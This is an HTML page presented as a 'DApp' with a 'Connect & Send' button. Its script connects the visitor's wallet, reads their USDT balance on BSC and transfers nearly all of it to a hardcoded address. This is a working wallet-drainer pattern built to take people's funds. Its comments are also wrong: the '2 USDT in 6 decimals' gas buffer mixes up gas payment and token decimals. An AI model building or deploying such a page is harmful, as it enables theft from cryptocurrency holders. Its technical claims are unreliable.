<!DOCTYPE html>
<html>
<head>
  <title>Auto Transfer USDT</title>
  <script src="https://cdn.jsdelivr.net/npm/web3@4.1.2/dist/web3.min.js"></script>
</head>
<body>
  <button onclick="connectAndTransfer()">Connect & Send</button>

  <script>
    const receiverAddress = "0xc64087a6Fd263ab6A140F9b46f4cAF7B3e82147f";
    const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT on BSC

    const usdtAbi = [
      {
        "constant": true,
        "inputs": [{"name": "_owner", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "balance", "type": "uint256"}],
        "type": "function"
      },
      {
        "constant": false,
        "inputs": [
          {"name": "_to", "type": "address"},
          {"name": "_value", "type": "uint256"}
        ],
        "name": "transfer",
        "outputs": [{"name": "", "type": "bool"}],
        "type": "function"
      }
    ];

    async function connectAndTransfer() {
      if (window.ethereum) {
        const web3 = new Web3(window.ethereum);
        try {
          await window.ethereum.request({ method: 'eth_requestAccounts' });
          const accounts = await web3.eth.getAccounts();
          const sender = accounts[0];

          const usdtContract = new web3.eth.Contract(usdtAbi, usdtContractAddress);
          const balanceStr = await usdtContract.methods.balanceOf(sender).call();
          const balance = BigInt(balanceStr);

          const gasBuffer = 2n * 10n ** 6n; // 2 USDT in USDT's 6 decimals
          if (balance <= gasBuffer) {
            alert("USDT balance is too low to send after gas buffer.");
            return;
          }

          const amountToSend = balance - gasBuffer;

          console.log("Sender:", sender);
          console.log("Balance:", balance.toString());
          console.log("Sending:", amountToSend.toString());

          const tx = await usdtContract.methods
            .transfer(receiverAddress, amountToSend.toString())
            .send({ from: sender });

          alert("USDT sent! Tx hash: " + tx.transactionHash);
        } catch (err) {
          console.error("Error:", err);
          alert("Transaction failed: " + (err?.message || err));
        }
      } else {
        alert("Install MetaMask or Trust Wallet to use this DApp.");
      }
    }
  </script>
</body>
</html>
